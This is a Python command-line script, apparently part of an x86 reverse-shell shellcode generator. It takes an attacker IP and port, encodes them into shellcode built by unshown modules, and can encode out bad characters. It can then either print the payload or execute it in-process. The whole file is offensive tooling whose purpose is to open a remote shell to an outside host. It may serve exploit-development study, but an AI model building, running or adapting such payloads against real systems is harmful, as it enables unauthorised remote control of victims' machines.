import argparse
import re
from keystone import Ks, KS_ARCH_X86, KS_MODE_32

import utils
import encoder
import x86

parser = argparse.ArgumentParser(description="This is an x86 shellcode generator/executor")

group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("-x", action="store_true", help="execute the shellcode in a thread, in python.exe process")
group.add_argument("-d", action="store_true", help="display the shellcode in python form")

parser.add_argument("-i", metavar="IP", default="127.0.0.1", help="set the IP of the reverse shell (default: 127.0.0.1)")
parser.add_argument("-p", metavar="PORT", default="443", help=" set the IP of the reverse shell (default: 443)")

# encoding-ul este optional
parser.add_argument("-e", action="store_true", help=" enable encoding (if specifying bad chars)")
parser.add_argument("-b", metavar="BAD CHARS", type=utils.parse_bytes, help=" bad characters")

args = parser.parse_args()

if(args.b and not args.e):
    parser.error("Bad chars cannot be specified if encoding is not enabled (-e parameter)")

ip = args.i
port = args.p

ip_regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
if(not re.search(ip_regex, ip)):
    print("Please provide an IP in -i argument.")
    exit()


print(f"The shellcode will connect to: {ip}:{port}")
print()
print()

ip_parts = ip.split(".")
hexa_ip = ""
for part in ip_parts:
    part = int(part)
    temp = str(hex(part))
    if(len(temp) > 4):
        print("Please provide an valid IP in -i argument.")
        exit()

    temp = temp[2:]

    if(len(temp)==1):
        temp = "0" + temp

    hexa_ip = temp + hexa_ip

hexa_ip = "0x" + hexa_ip

port = int(port)

if(port < 1 or port > 65535):
    print("Please provide an valid port in -p argument.")

hexa_port = str(hex(port))
hexa_port = hexa_port[2:]
if len(hexa_port)<4:
    hexa_port = '0' * (4-len(hexa_port)) + str(hexa_port)

first_part = hexa_port[0:2]
second_part = hexa_port[2:]
hexa_port = "0x" + second_part + first_part

shellcode = x86.generate_shellcode(hexa_ip, hexa_port)
offset=0

# avem encoding-ul activat
if(args.e):
    shellcode = encoder.encode(shellcode, args.b)

if(args.x):
    utils.execute_shellcode(shellcode)
elif(args.d):
    # vom afisa shellcode-ul
    utils.display_shellcode(shellcode)